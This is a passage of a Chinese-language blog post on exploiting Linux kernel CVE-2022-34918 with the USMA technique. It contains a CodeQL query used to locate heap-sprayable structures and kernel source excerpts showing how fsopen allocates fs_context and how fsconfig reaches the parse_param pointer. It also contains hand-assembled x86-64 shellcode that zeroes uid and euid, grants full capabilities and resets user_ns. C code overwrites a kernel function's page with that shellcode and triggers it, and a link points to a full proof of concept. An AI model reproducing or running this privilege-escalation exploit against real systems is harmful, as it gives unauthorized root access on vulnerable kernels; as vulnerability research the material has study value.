<p>CVE-2022-34918 在触发越界写时，其分配的堆块其实可以落在三种不同大小的slab中，即kmalloc-64，kmalloc-128和kmalloc-192中。当时为了找内核中有哪些会落在这三种slab中、且分配flags为 GFP_KERNEL 且比较容易分配能够堆喷的结构体时，我写了如下的CodeQL脚本用来初筛。其中过滤掉了arch和drivers目录是因为我觉得这两个目录下的结构体一般不太通用。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @kind problem</span><br><span class="line"> * @problem.severity warning</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from FunctionCall fc, Function f, int alloc_size, int alloc_flags, PointerType typ</span><br><span class="line">where</span><br><span class="line">  f = fc.getTarget() and</span><br><span class="line">  // 只查找kalloc和kzalloc类的函数</span><br><span class="line">  f.getName().regexpMatch(&quot;k[a-z]*alloc&quot;) and</span><br><span class="line">  alloc_size = fc.getArgument(0).getValue().toInt() and</span><br><span class="line">  // get object in kmalloc-64,128,192</span><br><span class="line">  (alloc_size &gt; 32 and alloc_size &lt;= 192) and</span><br><span class="line">  alloc_flags = fc.getArgument(1).getValue().toInt() and</span><br><span class="line">  // GFP_ACCOUNT == 0x400000(4194304)</span><br><span class="line">  alloc_flags.bitAnd(4194304) = 0 and</span><br><span class="line">  typ = fc.getActualType().(PointerType) and</span><br><span class="line">  not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch(&quot;arch.*&quot;) and </span><br><span class="line">  not fc.getEnclosingFunction().getFile().getRelativePath().regexpMatch(&quot;drivers.*&quot;) </span><br><span class="line">select fc, &quot;在 $@ 的 $@ 中发现一处调用 $@ 分配内存，结构体 $@, 大小 &quot; + alloc_size.toString(),</span><br><span class="line">fc,fc.getEnclosingFunction().getFile().getRelativePath(), fc.getEnclosingFunction(),</span><br><span class="line">  fc.getEnclosingFunction().getName().toString(), fc, f.getName(), typ.getBaseType(),</span><br><span class="line">  typ.getBaseType().getName()</span><br></pre></td></tr></table></figure>



<p>我挨个查看得到的结果，查看是否可能包含有内核代码段地址的成员，以及是否方便堆喷。最后目光锁定到了 fs_context 这个结构体上。</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812000450869.png"></p>
<p>先来看一眼 fs_context 中有哪些有趣的成员吧。ops 不用多说，可以用来泄露内核基地址，也可以用来劫持控制流。等等！怎么还有cred指针？ 怎么还有user_ns？没看错吧？（我当时就这表情）</p>
<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812001321301.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Filesystem context for holding the parameters used in the creation or</span></span><br><span class="line"><span class="comment"> * reconfiguration of a superblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Superblock creation fills in -&gt;root whereas reconfiguration begins with this</span></span><br><span class="line"><span class="comment"> * already set.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See Documentation/filesystems/mount_api.txt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uapi_mutex</span>;</span>	<span class="comment">/* Userspace access mutex */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>	*<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="type">void</span>			*fs_private;	<span class="comment">/* The filesystem&#x27;s context */</span></span><br><span class="line">	<span class="type">void</span>			*sget_key;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>		*<span class="title">root</span>;</span>		<span class="comment">/* The root and superblock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span>	<span class="comment">/* The user namespace for this mount */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span>		*<span class="title">net_ns</span>;</span>	<span class="comment">/* The network namespace for this mount */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">cred</span>;</span>		<span class="comment">/* The mounter&#x27;s credentials */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>		*<span class="title">log</span>;</span>		<span class="comment">/* Logging buffer */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*source;	<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line">	<span class="type">void</span>			*security;	<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line">	<span class="type">void</span>			*s_fs_info;	<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags;	<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags_mask;	<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		s_iflags;	<span class="comment">/* OR&#x27;d with sb-&gt;s_iflags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		lsm_flags;	<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span>	<span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span>	<span class="title">phase</span>:</span><span class="number">8</span>;	<span class="comment">/* The phase the context is in */</span></span><br><span class="line">	<span class="type">bool</span>			need_free:<span class="number">1</span>;	<span class="comment">/* Need to call ops-&gt;free() */</span></span><br><span class="line">	<span class="type">bool</span>			global:<span class="number">1</span>;	<span class="comment">/* Goes into &amp;init_user_ns */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<p>之后我跟了一下调用链，只需要通过简单的fsopen就能触发 fs_context 的分配：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fsopen.c:115</span></span><br><span class="line"><span class="comment">/* 115 */</span> SYSCALL_DEFINE2(fsopen, <span class="type">const</span> <span class="type">char</span> __user *, _fs_name, <span class="type">unsigned</span> <span class="type">int</span>, flags)</span><br><span class="line"><span class="comment">/* 116 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 118 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">------</span><br><span class="line">    		<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 137 */</span> 	fc = fs_context_for_mount(fs_type, <span class="number">0</span>);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 148 */</span> 	<span class="keyword">return</span> fscontext_create_fd(fc, flags &amp; FSOPEN_CLOEXEC ? O_CLOEXEC : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fs_context.c:301</span></span><br><span class="line"><span class="comment">/* 301 */</span> <span class="keyword">struct</span> fs_context *<span class="title function_">fs_context_for_mount</span><span class="params">(<span class="keyword">struct</span> file_system_type *fs_type,</span></span><br><span class="line"><span class="params"><span class="comment">/* 302 */</span> 					<span class="type">unsigned</span> <span class="type">int</span> sb_flags)</span></span><br><span class="line"><span class="comment">/* 303 */</span> &#123;</span><br><span class="line">    		<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 304 */</span> 	<span class="keyword">return</span> alloc_fs_context(fs_type, <span class="literal">NULL</span>, sb_flags, <span class="number">0</span>,</span><br><span class="line"><span class="comment">/* 305 */</span> 					FS_CONTEXT_FOR_MOUNT);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fs_context.c:247</span></span><br><span class="line"><span class="comment">/* 247 */</span> <span class="type">static</span> <span class="keyword">struct</span> fs_context *<span class="title function_">alloc_fs_context</span><span class="params">(<span class="keyword">struct</span> file_system_type *fs_type,</span></span><br><span class="line"><span class="params"><span class="comment">/* 248 */</span> 				      <span class="keyword">struct</span> dentry *reference,</span></span><br><span class="line"><span class="params"><span class="comment">/* 249 */</span> 				      <span class="type">unsigned</span> <span class="type">int</span> sb_flags,</span></span><br><span class="line"><span class="params"><span class="comment">/* 250 */</span> 				      <span class="type">unsigned</span> <span class="type">int</span> sb_flags_mask,</span></span><br><span class="line"><span class="params"><span class="comment">/* 251 */</span> 				      <span class="keyword">enum</span> fs_context_purpose purpose)</span></span><br><span class="line"><span class="comment">/* 252 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 257 */</span> 	fc = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> fs_context), GFP_KERNEL);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 261 */</span> 	fc-&gt;purpose	= purpose;</span><br><span class="line"><span class="comment">/* 262 */</span> 	fc-&gt;sb_flags	= sb_flags;</span><br><span class="line"><span class="comment">/* 263 */</span> 	fc-&gt;sb_flags_mask = sb_flags_mask;</span><br><span class="line"><span class="comment">/* 264 */</span> 	fc-&gt;fs_type	= get_filesystem(fs_type);</span><br><span class="line"><span class="comment">/* 265 */</span> 	fc-&gt;cred	= get_current_cred();</span><br><span class="line"><span class="comment">/* 266 */</span> 	fc-&gt;net_ns	= get_net(current-&gt;nsproxy-&gt;net_ns);</span><br><span class="line"><span class="comment">/* 267 */</span> 	fc-&gt;<span class="built_in">log</span>.prefix	= fs_type-&gt;name;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 271 */</span> 	<span class="keyword">switch</span> (purpose) &#123;</span><br><span class="line"><span class="comment">/* 272 */</span> 	<span class="keyword">case</span> FS_CONTEXT_FOR_MOUNT:</span><br><span class="line"><span class="comment">/* 273 */</span> 		fc-&gt;user_ns = get_user_ns(fc-&gt;cred-&gt;user_ns);</span><br><span class="line"><span class="comment">/* 274 */</span> 		<span class="keyword">break</span>;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 290 */</span> 	ret = init_fs_context(fc);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 293 */</span> 	fc-&gt;need_free = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">/* 294 */</span> 	<span class="keyword">return</span> fc;</span><br></pre></td></tr></table></figure>



<p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ps. should unshare user namespace first</span></span><br><span class="line"><span class="type">int</span> fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>有一点需要额外注意！Line 257 在对 fs_context 的分配在老版本中为 GFP_KERNEL，但在新版本的内核中被改为了 GFP_KERNEL_ACCOUNT。</p>
<p>这是由 commit  <a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/commit/bb902cb47cf93b33cd92b3b7a4019330a03ef57f">bb902cb47c</a> 修复的（2021年9月4日），且这个commit不视为feature而是bug，因此在新的较低版本中也进行了修改。</p>
<p>此外，fs_context首次出现于Linux kernel 5.1中，且fsconfig syscall 首次出现与Linux kernel 5.2 中。</p>
<p>这里我们使用 GFP_KERNEL 的老版本。</p>
</blockquote>
<p>这样我们的利用思路就发生了少许变化：先还是先通过漏洞本身提供的堆越界写原语和 struct user_key_payload 得到了堆越界读原语；之后透过 fsopen syscall 来堆喷 struct fs_context结构体，再透过之前的堆越界读原语泄露出其中的ops指针和cred指针。</p>
<p>一开始我想，是否能直接通过USMA去修改cred指针所在页的内容从而直接提权。但我马上否定了这个想法，因为mmap时存在校验，不能mmap slab页。</p>
<p>但马上我又想到了另一个思路。</p>
<p>前面leak出来的ops指针为内核rodata段的一个结构体，即 struct fs_context_operations。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> (*<span class="built_in">free</span>)(<span class="keyword">struct</span> fs_context *fc);</span><br><span class="line">	<span class="type">int</span> (*dup)(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_context *src_fc);</span><br><span class="line">	<span class="type">int</span> (*parse_param)(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param);</span><br><span class="line">	<span class="type">int</span> (*parse_monolithic)(<span class="keyword">struct</span> fs_context *fc, <span class="type">void</span> *data);</span><br><span class="line">	<span class="type">int</span> (*get_tree)(<span class="keyword">struct</span> fs_context *fc);</span><br><span class="line">	<span class="type">int</span> (*reconfigure)(<span class="keyword">struct</span> fs_context *fc);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>通过USMA，我们可以读取到ops地址下的这群函数指针；再次通过USMA，我们可以将这些函数所在的页mmap到用户态进行读写。</p>
<p>因为前面我们已经拿到了cred的地址，因此将函数的内容patch成一段修改cred结构体的shellcode；之后通过某些路径调用到这些函数就能在内核态执行我们的shellcode从而完成cred的修改。</p>
<p>这里我以指针 parse_param 为例，通过分析我发现可以透过 fsconfig syscall 来触发。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fsopen.c:314</span></span><br><span class="line"><span class="comment">/* 314 */</span> SYSCALL_DEFINE5(fsconfig,</span><br><span class="line"><span class="comment">/* 315 */</span> 		<span class="type">int</span>, fd,</span><br><span class="line"><span class="comment">/* 316 */</span> 		<span class="type">unsigned</span> <span class="type">int</span>, cmd,</span><br><span class="line"><span class="comment">/* 317 */</span> 		<span class="type">const</span> <span class="type">char</span> __user *, _key,</span><br><span class="line"><span class="comment">/* 318 */</span> 		<span class="type">const</span> <span class="type">void</span> __user *, _value,</span><br><span class="line"><span class="comment">/* 319 */</span> 		<span class="type">int</span>, aux)</span><br><span class="line"><span class="comment">/* 320 */</span> &#123;</span><br><span class="line"><span class="comment">/* 321 */</span> 	<span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> *<span class="title">fc</span>;</span></span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 364 */</span> 	f = fdget(fd);</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 371 */</span> 	fc = f.file-&gt;private_data;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 437 */</span> 	ret = mutex_lock_interruptible(&amp;fc-&gt;uapi_mutex);</span><br><span class="line"><span class="comment">/* 438 */</span> 	<span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">    			<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 439 */</span> 		ret = vfs_fsconfig_locked(fc, cmd, &amp;param);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fsopen.c:216</span></span><br><span class="line"><span class="comment">/* 216 */</span> <span class="type">static</span> <span class="type">int</span> <span class="title function_">vfs_fsconfig_locked</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params"><span class="comment">/* 217 */</span> 			       <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line"><span class="comment">/* 218 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 225 */</span> 	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 260 */</span> 	<span class="keyword">default</span>:</span><br><span class="line"><span class="comment">/* 261 */</span> 		<span class="keyword">if</span> (fc-&gt;phase != FS_CONTEXT_CREATE_PARAMS &amp;&amp;</span><br><span class="line"><span class="comment">/* 262 */</span> 		    fc-&gt;phase != FS_CONTEXT_RECONF_PARAMS)</span><br><span class="line"><span class="comment">/* 263 */</span> 			<span class="keyword">return</span> -EBUSY;</span><br><span class="line"><span class="comment">/* 264 */</span> </span><br><span class="line">        		<span class="comment">// 调用</span></span><br><span class="line"><span class="comment">/* 265 */</span> 		<span class="keyword">return</span> vfs_parse_fs_param(fc, param);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"><span class="comment">// &gt;&gt;&gt; fs/fs_context.c:127</span></span><br><span class="line"><span class="comment">/* 127 */</span> <span class="type">int</span> <span class="title function_">vfs_parse_fs_param</span><span class="params">(<span class="keyword">struct</span> fs_context *fc, <span class="keyword">struct</span> fs_parameter *param)</span></span><br><span class="line"><span class="comment">/* 128 */</span> &#123;</span><br><span class="line">------</span><br><span class="line"><span class="comment">/* 145 */</span> 	<span class="keyword">if</span> (fc-&gt;ops-&gt;parse_param) &#123;</span><br><span class="line">    			<span class="comment">// 调用目标虚表指针</span></span><br><span class="line"><span class="comment">/* 146 */</span> 		ret = fc-&gt;ops-&gt;parse_param(fc, param);</span><br><span class="line"><span class="comment">/* 147 */</span> 		<span class="keyword">if</span> (ret != -ENOPARAM)</span><br><span class="line"><span class="comment">/* 148 */</span> 			<span class="keyword">return</span> ret;</span><br><span class="line"><span class="comment">/* 149 */</span> 	&#125;</span><br></pre></td></tr></table></figure>



<p>示例代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ps. should unshare user namespace first</span></span><br><span class="line"><span class="type">int</span> fd = fsopen(<span class="string">&quot;ext4&quot;</span>, <span class="number">0</span>);</span><br><span class="line">fsconfig(fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;AAAA&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>



<p>下一步就是编写目标shellcode了。这里我手搓了一段shellcode来修改cred中的 uid、euid、cap_inheritable、cap_permitted、cap_effective 以及 user_ns。调用完shellcode后马上还原函数内容，防止影响到内核的正常使用。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint8_t</span> shellcode[] = &#123;</span><br><span class="line">    <span class="comment">// mov rax, 0x4141414141414141 (cred ptr)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>, <span class="number">0x41</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// xor rdi, rdi</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xff</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mov dword ptr [rax+4], edi (uid)</span></span><br><span class="line">    <span class="comment">// mov dword ptr [rax+20], edi (euid)</span></span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x14</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mov rdi, 0x000001ffffffffff</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xbf</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0xff</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// mov qword ptr [rax+0x28], rdi (cap_inheritable)</span></span><br><span class="line">    <span class="comment">// mov qword ptr [rax+0x30], rdi (cap_permitted)</span></span><br><span class="line">    <span class="comment">// mov qword ptr [rax+0x38], rdi (cap_effective)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x28</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x78</span>, <span class="number">0x38</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// lea rdi, qword ptr [rax+136] (user_ns)</span></span><br><span class="line">    <span class="comment">// mov rsi, qword ptr [rdi]</span></span><br><span class="line">    <span class="comment">// mov rsi, qword ptr [rsi+216] (parent)</span></span><br><span class="line">    <span class="comment">// mov qword ptr [rdi], rsi</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8d</span>, <span class="number">0xb8</span>, <span class="number">0x88</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x37</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0xb6</span>, <span class="number">0xd8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0x37</span>,</span><br><span class="line"></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>, <span class="comment">// xor rax,rax</span></span><br><span class="line">    <span class="number">0xc3</span>,             <span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint8_t</span> backup[<span class="keyword">sizeof</span>(shellcode)] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *pos = (<span class="type">uint64_t</span> *)&amp;page[leak_ptrs.parse_param_fptr &amp; <span class="number">0xfff</span>];</span><br><span class="line">*(<span class="type">uint64_t</span> *)(shellcode + <span class="number">2</span>) = leak_ptrs.cred_ptr; <span class="comment">// patch cred_ptr</span></span><br><span class="line"><span class="built_in">memcpy</span>(backup, pos, <span class="keyword">sizeof</span>(backup));</span><br><span class="line"><span class="built_in">memcpy</span>(pos, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">fsconfig(fd, FSCONFIG_SET_STRING, <span class="string">&quot;\x00&quot;</span>, <span class="string">&quot;AAAA&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(pos, backup, <span class="keyword">sizeof</span>(backup));</span><br></pre></td></tr></table></figure>



<p><img src="/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/image-20220812151341023.png"></p>
<p>poc链接：<a target="_blank" rel="noopener" href="https://github.com/veritas501/CVE-2022-34918/tree/master/poc_fs_context_cred_common">https://github.com/veritas501/CVE-2022-34918/tree/master/poc_fs_context_cred_common</a></p>
<p>这个过程虽然使用到了内核地址，但没有使用偏移进行计算，因此只要确保内核受影响即可攻击成功，并不需要预先对内核进行分析。</p>
<p>可以看到 struct fs_context 确实威力不小，简简单单就leak到了进程的 cred 指针和user namespace 指针。</p>
<p>但正也如上面所说，struct fs_context在较新的内核中开始使用 GFP_KERNEL_ACCOUNT  flags进行分配。而USMA使用的 pg_vec 使用 GFP_KERNEL 进行分配。前者会被放入 kmalloc-cg-xxx cache中，后者则放入 kmalloc-xxx cache 中。而分配这些cache时一般会一次性申请8个page（可以查看&#x2F;proc&#x2F;slabinfo），因此除非做好 page level 的风水，否则很难让这两个结构体在虚拟地址空间上挨在一起。</p>
<blockquote>
<p>PS： struct fs_context在新版本中使用 GFP_KERNEL_ACCOUNT 分配对内核漏洞利用来说可能并不是一件坏事，因为有诸多类似 struct msg_msg的重量级选手都使用 GFP_KERNEL_ACCOUNT flags进行分配，因此leak cred可能会变得更加容易。</p>
</blockquote>
<p>那如果不借助 struct fs_context 是否还能通过注入shellcode的方式进行地址无关的提权攻击呢？答案是肯定的。</p>
